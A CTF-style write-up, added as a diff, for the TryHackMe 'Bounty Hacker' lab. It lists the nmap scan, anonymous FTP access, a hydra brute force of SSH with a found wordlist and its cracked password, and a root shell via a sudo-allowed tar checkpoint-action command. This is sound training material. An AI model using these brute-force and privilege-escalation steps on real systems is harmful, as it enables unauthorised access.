@@ -1,0 +1,116 @@
+# Bounty Hacker — TryHackMe Write-Up
+
+**Difficulty:** Easy  
+**Room Link:** https://tryhackme.com/room/cowboyhacker
+
+---
+
+## 🛰️ Enumeration
+
+I started with a basic Nmap scan to find open ports on the target machine:
+
+```bash
+sudo nmap -sV -Pn 10.10.39.210
+```
+
+**Scan Results:**
+```
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
+80/tcp open  http    Apache httpd
+```
+
+---
+
+## 📁 FTP Access
+
+I checked if anonymous login was allowed:
+
+```bash
+ftp 10.10.39.210
+# Username: anonymous
+# Password: (blank or any)
+```
+
+It worked! I found two files:
+- `task.txt` (mentions a user named *lin*)
+- `locks.txt` (looked like a password list)
+
+---
+
+## 🧪 Brute-Forcing SSH
+
+Since port 22 (SSH) was open and I had a user (`lin`) and a possible wordlist (`locks.txt`), I used `hydra` to brute-force the password:
+
+```bash
+hydra -l lin -P locks.txt ssh://10.10.39.210
+```
+
+**Result:**
+```
+[22][ssh] host: 10.10.39.210   login: lin   password: RedDr4gonSynd1cat3
+```
+
+---
+
+## 🔑 SSH Access
+
+With credentials in hand, I logged in:
+
+```bash
+ssh lin@10.10.39.210
+  password: RedDr4gonSynd1cat3
+```
+
+Then grabbed the first flag:
+
+```bash
+cat user.txt
+```
+
+---
+
+## 🚀 Privilege Escalation
+
+I checked for `sudo` permissions:
+
+```bash
+sudo -l
+```
+
+**Output:**
+```
+User lin may run the following commands on bountyhacker:
+    (root) /bin/tar
+```
+
+That was the breakthrough. Using GTFOBins, I ran the following command to spawn a root shell:
+
+```bash
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
+
+The prompt changed from `$` to `#`, confirming root access.
+
+---
+
+## 🏁 Root Flag
+
+Then I just grabbed the final flag:
+
+```bash
+cat /root/root.txt
+```
+
+---
+
+## 🧠 Lessons Learned
+
+- How to check for and exploit anonymous FTP access
+- Using Hydra to brute-force SSH login with a custom wordlist
+- Leveraging GTFOBins for privilege escalation with `tar`
+- Practice writing documentation in Markdown and using GitHub
+
+---
+
